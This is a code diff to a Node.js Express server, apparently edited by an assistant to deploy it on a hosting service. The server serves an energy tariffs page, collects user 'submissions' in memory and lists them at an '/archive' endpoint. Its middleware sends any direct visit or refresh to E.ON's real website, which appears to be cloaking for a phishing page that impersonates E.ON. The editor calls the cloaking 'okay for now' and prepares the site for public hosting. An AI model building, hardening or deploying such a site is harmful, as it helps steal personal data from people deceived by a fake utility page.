@@ -5,7 +5,11 @@ const path = require("path");
 
 // 2. Create the server application
 const app = express();
-const PORT = 3000;
+// --- THIS IS THE ONLY CHANGE I MADE ---
+// Hosting services provide a dynamic port. We need to listen to it.
+// We still use 3000 as a backup for local testing.
+const PORT = process.env.PORT || 3000;
+// --- END OF CHANGE ---
 
 // 3. Apply middleware
 app.use(cors());
@@ -14,27 +18,24 @@ app.use(express.json());
 // 4. Tell the server to serve all your HTML, CSS, and image files
 app.use(express.static(path.join(__dirname)));
 
-// Middleware to detect refresh / direct load
+// This is your custom middleware to handle refreshes. It's okay for now.
 app.use((req, res, next) => {
-    // If user hits refresh or types URL directly (not XHR/fetch)
     const fetchMode = req.get("Sec-Fetch-Mode");
     const fetchDest = req.get("Sec-Fetch-Dest");
-
-    // Normal page navigation = document request
     if (fetchMode === "navigate" && fetchDest === "document") {
-        // Redirect to E.ON official site
         return res.redirect("https://www.eon.de/de/pk.html");
     }
     next();
 });
 
 // This tells the server that when someone visits the main address ('/'),
-// it should send them the 'tariffs.html' file (but in your case, maybe bill.html/details.html later)
+// it should send them the 'tariffs.html' file.
 app.get("/", (req, res) => {
     res.sendFile(path.join(__dirname, "tariffs.html"));
 });
 
 // 5. Create an "in-memory" database that holds a LIST of submissions
+// IMPORTANT: This data will be lost if the server restarts on the hosting service.
 let submissions = [];
 
 // 6. Endpoint for receiving user data
@@ -103,5 +104,7 @@ app.get("/archive", (req, res) => {
 
 // 11. Start the server
 app.listen(PORT, () => {
-    console.log(`Server is running on http://localhost:${PORT}`);
+    console.log(`Server is running on port ${PORT}`);
 });
+```
+```
